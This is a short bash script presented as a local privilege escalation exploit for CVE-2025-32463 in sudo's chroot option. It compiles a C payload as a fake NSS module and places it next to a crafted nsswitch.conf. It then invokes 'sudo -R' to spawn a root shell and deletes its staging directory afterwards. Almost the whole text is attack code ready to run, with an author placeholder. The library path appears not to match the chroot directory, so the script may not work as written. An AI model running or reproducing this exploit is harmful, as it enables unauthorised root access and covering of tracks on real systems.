#!/bin/bash
# shadow-escalate.sh - CVE-2025-32463 Local Privilege Escalation Exploit
# Author: [Your Name or Alias]

set -euo pipefail

# Check tools
command -v gcc >/dev/null || { echo "[!] gcc not found."; exit 1; }
command -v sudo >/dev/null || { echo "[!] sudo not found."; exit 1; }

# Create working dir
STAGE=$(mktemp -d /tmp/.shadowroot.XXXXXX)
cd "$STAGE"

# Payload: elevate privileges
cat > corelib_root.c <<EOF
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void root_elevate(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "bash", NULL);
}
EOF

# Fake NSS environment
mkdir -p ghostroot/etc corelib/
echo "passwd: shadowroot" > ghostroot/etc/nsswitch.conf
cp /etc/group ghostroot/etc

# Compile exploit as NSS module
gcc -Wall -fPIC -shared -Wl,-init,root_elevate -o corelib/libnss_shadowroot.so.2 corelib_root.c

echo "[+] Exploit compiled. Launching sudo with root override..."

# Trigger vulnerability
sudo -R ghostroot bash <<EOF
echo "[!] Root shell initiated via NSS abuse."
whoami
id
EOF

# Clean up
cd /
rm -rf "$STAGE"
echo "[*] Cleanup complete."
